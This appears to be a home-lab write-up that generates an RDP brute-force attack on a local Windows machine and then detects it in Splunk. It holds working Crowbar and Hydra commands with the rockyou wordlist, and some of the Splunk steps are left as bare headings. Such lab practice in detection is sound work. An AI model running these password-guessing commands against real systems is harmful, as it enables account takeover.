Environment: Windows 11, Kali Linux
Tools Used: Splunk, Crowbar, Hydra, Event Viewer, Notepad


PHASE 1 – GENERATE RDP BRUTE FORCE ATTACK (Kali Linux)

1. CREATE USER LIST
echo -e "testuser\ntestuser01" > users.txt

2. FIX WORDLIST ENCODING
sudo iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o /usr/share/wordlists/rockyou-utf8.txt

3. RDP BRUTE FORCE WITH CROWBAR
crowbar -b rdp -s 192.168.1.34/32 -u testuser -C /usr/share/wordlists/rockyou-utf8.txt -v

4. RDP BRUTE FORCE WITH HYDRA (ALTERNATIVE)
hydra -l testuser -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.34 -t 1 -w 5 -V

Note: Attack stopped early due to high CPU usage. Enough failed logins generated.

PHASE 3 – ADD WINDOWS LOGS TO SPLUNK

6. ADD DATA IN SPLUNK

Source type: WinEventLog:Security

7. SEARCH FAILED LOGINS IN SPLUNK

8. SEARCH SUCCESSFUL RDP LOGINS

WHAT I LEARNED

- Hydra RDP module is unstable; Crowbar works better for RDP brute force
- Wordlist encoding issues can be fixed with iconv
- Windows Security Logs need to be added manually in Splunk
- Event ID 4625 indicates failed login attempts
- Alert rules in Splunk help automate detection
- Always add at least one action (e.g., Triggered Alerts) when saving alert
